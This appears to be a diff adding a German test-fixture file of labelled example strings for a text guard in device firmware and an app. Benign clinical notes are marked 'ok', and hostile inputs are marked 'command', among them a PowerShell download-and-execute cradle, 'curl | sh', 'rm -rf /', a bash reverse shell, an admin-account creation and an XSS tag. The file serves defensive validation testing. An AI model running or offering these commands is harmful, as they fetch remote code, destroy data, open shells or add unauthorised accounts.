@@ -1,0 +1,37 @@
+# Gemeinsame Beispiele fuer die Pruefung des Knopf-Textes (Firmware StoredGuard.h und App storedTextGuard.ts).
+# Format: Urteil<TAB>Text. Im Text stehen \n (Zeilenumbruch), \t (Tabulator), \e (Escape), \b (Ruecktaste), \r und \\ als Ersatzfolgen.
+ok	Pat. wach, orientiert, GCS 15.\nRR 140/90, HF 88, SpO2 97 %, BZ 102 mg/dl.
+ok	Übergabe an ZNA; kein Hinweis auf A-, B- oder C-Problem. Größe 1,80 m, Gewicht ~80 kg.
+ok	V. a. ACS -> ASS 250 mg i.v. & Heparin 5000 IE, RR > 180 mmHg, Temp. < 36 °C
+ok	Curling-Ulkus, Perle, CMD bekannt, Internet user, Modell / Typ, Pythonschlange
+ok	Pat. sagt: "geht's wieder", Schmerz 3/10 (NRS) [Ruhe] {Belastung} 100 %ig
+ok	Kontakt: hausarzt@example.de | Tel. 06131 000000 | Fax s. o.
+ok	Shutdown-Syndrom unwahrscheinlich; Format A4; Reg. Nr. 12
+control	Anamnese:\tunauffällig
+control	Text\eOP
+control	Text\b\b
+control	Zeile 1\r\nZeile 2
+command	powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://x')"
+command	p^owershell -c calc
+command	Power""Shell
+command	po`wershell
+command	POWERSHELL
+command	cmd.exe /c calc
+command	cmd /c start calc
+command	curl  -s x | sh
+command	Text\ncurl
+command	sudo rm -rf /
+command	rm  -rf ~
+command	bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+command	calc.exe
+command	start https://example.com/a
+command	a && b
+command	a || b
+command	echo $(whoami)
+command	reg add HKCU\\Software\\X
+command	\\\\server\\share\\x
+command	osascript -e 'tell app "Terminal"'
+command	net user admin geheim /add
+command	python3 -c "import os"
+command	<script>alert(1)</script>
+command	C:\\Windows\\System32
